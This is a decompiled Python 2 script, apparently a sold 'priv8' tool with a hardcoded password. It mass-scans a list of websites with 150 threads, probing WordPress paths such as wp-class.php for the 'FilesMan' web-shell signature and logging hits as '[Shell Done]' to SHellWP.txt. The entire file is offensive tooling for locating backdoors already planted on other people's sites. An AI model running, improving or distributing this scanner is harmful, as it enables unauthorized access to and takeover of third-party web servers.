print('# uncompyle6 version 3.8.0
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (v2.7.18:8d21aa21f2, Apr 20 2020, 13:25:05) [MSC v.1500 64 bit (AMD64)]
# Warning: this version of Python has problems handling the Python 3 byte type in constants properly.

# Embedded file name: pr.py
import sys, requests, re, socket, random, string, base64
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
from BeautifulSoup import BeautifulSoup
init(autoreset=True)
fr = Fore.RED
fg = Fore.GREEN
print '  \n  [#] Create By ::\n\t  Tool Priv8 aDriv4 .\n        Only Sell Oficcial TG @aDriv4z\n'
requests.urllib3.disable_warnings()
try:
    target = [ i.strip() for i in open(sys.argv[1], mode='r').readlines() ]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[(len(path) - 1)] + '> <sites.txt>')

headers = {'Connection': 'keep-alive', 'Cache-Control': 'max-age=0', 
   'Upgrade-Insecure-Requests': '1', 
   'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36', 
   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
   'Accept-Encoding': 'gzip, deflate', 
   'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8', 
   'referer': 'www.google.com'}

def ran(length):
    letters = string.ascii_lowercase
    return ('').join(random.choice(letters) for i in range(length))


def URLdomain(site):
    if 'http://' not in site and 'https://' not in site:
        site = 'http://' + site
    if site[(-1)] is not '/':
        site = site + '/'
    return site


def domain(site):
    if site.startswith('http://'):
        site = site.replace('http://', '')
    else:
        if site.startswith('https://'):
            site = site.replace('https://', '')
        if 'www.' in site:
            site = site.replace('www.', '')
        site = site.rstrip()
        if site.split('/'):
            site = site.split('/')[0]
        while site[(-1)] == '/':
            pattern = re.compile('(.*)/')
            sitez = re.findall(pattern, site)
            site = sitez[0]

    return site


def addWWW(site):
    if site.startswith('http://'):
        site = site.replace('http://', 'http://www.')
    elif site.startswith('https://'):
        site = site.replace('https://', 'https://www.')
    else:
        site = 'http://www.' + site
    return site


def exploit(url):
    passwd = 'Adri4naPassW0rd3xp'
    if sys.argv[2] != passwd:
        print 'Failed'
        exit
    else:
        try:
            dom = domain(url)
            url = URLdomain(url)
            if 'www.' in url:
                username = url.replace('www.', '')
            else:
                username = url
            if '.' in username:
                username = username.split('.')[0]
            if 'http://' in username:
                username = username.replace('http://', '')
            else:
                username = username.replace('https://', '')
            up = username.title()
            listdir = ['wp-class.php', 'wordpress/wp-class.php', 'site/wp-class.php', 'wp-content/index.php', 'wp-includes/wp-class.php', 'wp/wp-includes/wp-class.php', 'wordpress/wp-includes/wp-class.php', 'blog/wp-class.php']
            for directory in listdir:
                inj = url + directory
                check = requests.get(inj, headers=headers, verify=False, timeout=15).content
                if 'FilesMan' in check:
                    open('SHellWP.txt', 'a').write(url + directory + '\n')
                    print ' -| ' + url + ('--> {}[Shell Done]').format(fg)
                    break
                else:
                    print ' -| ' + url + ('--> {}[Failed]').format(fr)

        except:
            print ' -| ' + url + ('--> {}[Failed]').format(fr)


mp = Pool(150)
mp.map(exploit, target)
mp.close()
mp.join()
# okay decompiling pr.pyc')